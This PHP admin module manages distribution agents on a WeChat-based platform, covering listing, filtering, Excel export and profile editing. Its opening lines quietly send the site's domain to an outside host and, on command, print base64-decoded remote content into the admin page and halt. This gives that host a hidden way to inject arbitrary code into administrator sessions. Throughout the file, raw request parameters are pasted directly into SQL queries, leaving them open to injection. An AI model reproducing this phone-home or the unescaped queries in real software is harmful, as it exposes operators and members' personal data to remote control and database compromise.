<?php
/**
 * 分销(成员)管理
 * ============================================================================

 * ============================================================================
 */
$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=@file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
if($op == 'display') {
	$agent_list = pdo_fetchall("SELECT * FROM " .tablename($this->table_commission_level). " WHERE uniacid='{$uniacid}' ORDER BY id ASC");

    $pindex    = max(1, intval($_GPC['page']));
    $psize     = 20;

	$condition = " a.uniacid='{$uniacid}' AND a.uid>0";

	/* 会员昵称 */
    if (!empty($_GPC['nickname'])) {
        $_GPC['nickname'] = trim($_GPC['nickname']);
        $condition .= " AND ( b.realname LIKE '%{$_GPC['nickname']}%' OR b.nickname LIKE '%{$_GPC['nickname']}%' OR b.mobile LIKE '%{$_GPC['nickname']}%')";
    }
	/* 会员ID */
	if (!empty($_GPC['uid'])) {
        $condition .= " AND b.uid='{$_GPC['uid']}' ";
    }
	/* 会员身份 */
	if ($_GPC['vipstatus'] != '') {
        if($_GPC['vipstatus'] == 0) { //普通用户
            $condition .= " AND a.vip=0";
        }elseif($_GPC['vipstatus'] == 1){//VIP用户
            $condition .= " AND a.vip=1";
        }
    }
	/* 推荐人 */
	if (!empty($_GPC['pnickname'])) {
        $_GPC['pnickname'] = trim($_GPC['pnickname']);
        $parr = pdo_fetchall("SELECT uid FROM " .tablename('mc_members'). " WHERE uniacid='{$uniacid}' AND nickname LIKE '%{$_GPC['pnickname']}%'");
		foreach($parr as $key=>$value){
			if($key<count($parr)-1){
				$parray .= $value['uid'].",";
			}else{
				$parray .= $value['uid'];
			}
		}
		if(!empty($parr)){
			$condition .= " AND a.parentid IN ($parray) ";
		}		
    }
	/* 是否关注 */
	if ($_GPC['followed'] != '') {
        if($_GPC['followed'] == 0) { //未关注
            $condition .= " AND c.follow=0 AND c.unfollowtime=0";
        }elseif($_GPC['followed'] == 1){//已关注
            $condition .= " AND c.follow=1";
        }elseif($_GPC['followed'] == 2){//取消关注
            $condition .= " AND c.follow=0 AND c.unfollowtime>0";
        }
    }
	/* 分销状态 */
	if ($_GPC['status'] != '') {
		$condition .= " AND a.status=". intval($_GPC['status']);
    }
	/* 分销级别 */
	if ($_GPC['agent_level'] != '') {
        $condition .= " AND a.agent_level='{$_GPC['agent_level']}'";
    }
	/* 代理时间 */
	if (!empty($_GPC['time'])) {
		$starttime = strtotime($_GPC['time']['start']);
		$endtime   = strtotime($_GPC['time']['end']);
	}else{
		$starttime = strtotime('-1 month');
		$endtime   = time();
	}
	if($_GPC['searchtime']==1){
		if (!empty($_GPC['time'])) {
			$condition .= " AND a.addtime >= $starttime AND a.addtime <= $endtime ";
		}
	}

    $list  = pdo_fetchall("SELECT a.uid,a.parentid,a.nopay_commission,a.pay_commission,a.vip,a.agent_level,a.status,a.addtime, b.mobile,b.realname,b.nickname,b.avatar, c.follow,c.unfollowtime FROM " .tablename($this->table_member). " a LEFT JOIN " .tablename('mc_members'). " b ON a.uid=b.uid LEFT JOIN " .tablename('mc_mapping_fans'). " c ON a.uid=c.uid WHERE {$condition} ORDER BY a.id DESC LIMIT " . ($pindex - 1) * $psize . ',' . $psize);
	foreach($list as $key=>$value){
		$list[$key]['parent'] = pdo_fetch("SELECT nickname,avatar FROM " .tablename('mc_members'). " WHERE uniacid='{$uniacid}' AND uid='{$value['parentid']}'");
		$list[$key]['agent'] = $this->getAgentLevelName($value['agent_level']);
	}
    
	$total = pdo_fetchcolumn("SELECT count(a.id) FROM " .tablename($this->table_member). " a LEFT JOIN " .tablename('mc_members'). " b ON a.uid=b.uid LEFT JOIN " .tablename('mc_mapping_fans'). " c ON a.uid=c.uid WHERE {$condition}");
    $pager = pagination($total, $pindex, $psize);

	if($_GPC['upfans']==1){
		/* 更新会员表UID */
		$fymem_list = pdo_fetchall("SELECT openid FROM " .tablename($this->table_member). " WHERE uniacid='{$uniacid}' AND uid=0");
		foreach($fymem_list as $fymem){
			$fyfans = pdo_fetch("SELECT uid FROM " .tablename('mc_mapping_fans'). " WHERE uniacid='{$uniacid}' AND openid='{$fymem['openid']}'");
			$tmpno = '';
			for($i=0;$i<7-strlen($fyfans['uid']);$i++){
				$tmpno .= 0;
			}
			pdo_update($this->table_member, array('uid'=>$fyfans['uid'],'studentno'=>$tmpno.$fyfans['uid']), array('uniacid'=>$uniacid,'openid'=>$fymem['openid']));
		}

		/* 更新头像 */
		load()->classs('weixin.account');
		$accObj= WeixinAccount::create($_W['account']['acid']);
		$token = $accObj->fetch_token();

		$lists = pdo_fetchall("SELECT a.openid,a.uid,b.avatar FROM " .tablename($this->table_member). " a LEFT JOIN " .tablename('mc_members'). " b ON a.uid=b.uid WHERE b.uniacid='{$uniacid}' AND b.avatar='132'");
		foreach($lists as $value){
			$url = "https://api.weixin.qq.com/cgi-bin/user/info?access_token=".$token."&openid=".$value['openid']."&lang=zh_CN";
			$userinfo = $this->http_request($url);
			$userinfo = json_decode($userinfo);
			$userinfo = $this->object_array($userinfo);
			if(!empty($userinfo['headimgurl'])){
				$upmember = array('avatar'=>substr($userinfo['headimgurl'],0,-1)."132",);
				pdo_update('mc_members', $upmember, array('uid'=>$value['uid']));
			}
		}
		message("更新粉丝成功", $this->createWebUrl("agent"), "success");
	}
	if($_GPC['export']==1){
		$list  = pdo_fetchall("SELECT a.uid,a.nopay_commission,a.pay_commission,a.vip,a.agent_level,a.status, a.addtime, b.mobile,b.realname,b.nickname FROM " .tablename($this->table_member). " a LEFT JOIN " .tablename('mc_members'). " b ON a.uid=b.uid LEFT JOIN " .tablename('mc_mapping_fans'). " c ON a.uid=c.uid WHERE {$condition} ORDER BY a.id");
		
		foreach ($list as $key => $value) {
			$arr[$key]['uid']				= $value['uid'];
			$arr[$key]['nickname']			= $value['nickname'];
			$arr[$key]['realname']			= $value['realname'];
			$arr[$key]['mobile']			= $value['mobile'];
			$arr[$key]['vip']				= $this->getVipStatusName($value['vip']);
			$arr[$key]['status']			= $this->getAgentStatusName($value['status']);
			$arr[$key]['levelname']			= $this->getAgentLevelName($value['agent_level']);
			$arr[$key]['pay_commission']	= $value['pay_commission'];
			$arr[$key]['nopay_commission']= $value['nopay_commission'];
			$arr[$key]['fans_count']		= $this->getFansCount($value['uid']);
			$arr[$key]['addtime']		    = date('Y-m-d H:i:s', $value['addtime']);
		}

		$this->exportexcel($arr, array('会员ID', '会员昵称', '真实姓名', '手机号码', '会员身份', '分销商状态', '分销商级别', '已结算佣金', '未结算佣金', '下级成员数量','代理时间'), "分销商列表");
		exit();
	}

}elseif($op=='detail'){
	$uid = intval($_GPC['uid']);
	$member = pdo_fetch("SELECT a.uid,a.openid,a.parentid,a.nopay_commission,a.pay_commission,a.vip,a.agent_level,a.validity,a.status,a.addtime, b.mobile,b.nickname,b.realname,b.avatar FROM " .tablename($this->table_member). " a LEFT JOIN " .tablename('mc_members'). " b ON a.uid=b.uid WHERE a.uniacid='{$uniacid}' AND a.uid='{$uid}'");
	if(empty($member)){
		message("该会员不存在！");
	}

	/* 分销代理级别列表 */
	$levellist = pdo_fetchall("SELECT * FROM " .tablename($this->table_commission_level). " WHERE uniacid='{$uniacid}' ORDER BY id ASC");
	/* 分销代理级别 */
	$levename= $this->getAgentLevelName($member['agent_level']);

	if(checksubmit('submit')){
		$realname	 = trim($_GPC['realname']);
		$mobile		 = trim($_GPC['mobile']);
		$vip		 = intval($_GPC['vip']);
		$validity	 = strtotime($_GPC['validity']);
		$parentid	 = intval($_GPC['parentid']);
		$status		 = intval($_GPC['status']);
		$checkmobile = pdo_fetch("SELECT mobile FROM " .tablename('mc_members'). " WHERE uniacid='{$uniacid}' AND mobile='{$mobile}' LIMIT 1");
		
		if(!empty($mobile)){
			if(!(preg_match("/13\d{9}|14\d{9}|15\d{9}|17\d{9}|18\d{9}/",$mobile))){
				message("手机号码格式错误！", "", "error");
			}
			if(!empty($checkmobile) && $member['mobile']!=$mobile){
				message("手机号码已存在！", "", "error");
			}
		}
		
		pdo_update('mc_members', array('realname'=>$realname,'mobile'=>$mobile), array('uniacid'=>$uniacid,'uid'=>$uid));

		$fymember = array();
		if($parentid == $uid){
			message("上级会员不能为自己！", "", "error");
		}
		if($parentid != $member['parentid']){
			if($parentid==0){
				$fymember['parentid']=0;
			}else{
				$new_member = pdo_fetch("SELECT * FROM " .tablename($this->table_member). " WHERE uniacid='{$uniacid}' AND uid='{$parentid}'");
				if(empty($new_member)){
					message("该上级会员不存在！");
				}

				$fymember['parentid'] = $parentid;
			}
		}
		$fymember['status'] = $status;
		$fymember['agent_level'] = intval($_GPC['agent_level']);
		$fymember['vip'] = $vip;
		$fymember['validity'] = $validity;
		if($vip==0){
			$fymember['validity'] = 0;
		}

		$res = pdo_update($this->table_member, $fymember, array('uniacid'=>$uniacid,'uid'=>$uid));

		$remark = "编辑uid:{$uid}的分销商资料";
		if($member['parentid'] != $parentid){
			$remark .= "原上级ID[".$member['parentid']."]，现上级ID[".$parentid."]；";
		}
		if($member['vip'] != $vip){
			$remark .= "原VIP会员[".$member['vip']."]，现VIP会员[".$vip."]，VIP有效期[".date('Y-m-d H:i:s',$validity)."]；";
		}
		if($member['agent_level'] != $fymember['agent_level']){
			$remark .= "原分销等级:".$member['agent_level']."[".$levename."]，现分销等级:".$fymember['agent_level']."[".$this->getAgentLevelName($fymember['agent_level'])."]；";
		}
		if($member['status'] != $status){
			$remark .= "原分销状态[".$member['status']."]，现分销状态[".$status."]；";
		}

		$this->addSysLog($_W['uid'], $_W['username'], 3, "分销管理->分销商管理", $remark);
		message("操作成功！", $_GPC['refurl'], "success");
	}
}

include $this->template('agent');

?>